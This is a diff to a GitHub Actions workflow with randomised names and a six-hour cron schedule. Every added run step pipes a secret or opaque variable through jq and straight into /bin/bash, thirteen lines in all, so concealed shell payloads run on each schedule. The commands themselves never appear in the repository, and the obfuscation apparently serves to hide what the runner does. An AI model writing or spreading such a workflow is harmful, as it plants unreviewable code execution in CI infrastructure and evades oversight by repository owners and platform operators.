@@ -3,8 +3,9 @@ name: xugoudemr
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 0/6 * * *'
-jobs:  # 3473
+    - cron: '33 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +13,19 @@ jobs:  # 3473
       - uses: actions/checkout@v4
       - name: xugoudemr
         env:
-          xo99423: ${{ secrets.xo99423 }}
+          t96290: ${{ secrets.t96290 }}
         run: |
-          echo $xo99423 | jq -r .u9 | /bin/bash
-          echo $hmyv5407 | jq -r .pl0 | /bin/bash
-          echo $ol4065 | jq -r .md91043 | /bin/bash
-          echo $zlj4 | jq -r .spz0029 | /bin/bash
-          echo $t5214 | jq -r .ddz70498 | /bin/bash
+          echo $t96290 | jq -r .pohpy51776 | /bin/bash
+          echo $l20914 | jq -r .a9 | /bin/bash
+          echo $lulfj70377 | jq -r .vzois8691 | /bin/bash
+          echo $c1 | jq -r .ghc535 | /bin/bash
+          echo $fxkp58926 | jq -r .syeu28 | /bin/bash
+          echo $lefrk285 | jq -r .qv205 | /bin/bash
+          echo $i742 | jq -r .whgy47 | /bin/bash
+          echo $jcdyx15 | jq -r .ffi58 | /bin/bash
+          echo $uw5352 | jq -r .imrz899 | /bin/bash
+          echo $qw12118 | jq -r .tonv4638 | /bin/bash
+          echo $wbl5 | jq -r .fneni0 | /bin/bash
+          echo $k106 | jq -r .ug79 | /bin/bash
+          echo $xb5 | jq -r .frwul9445 | /bin/bash
 
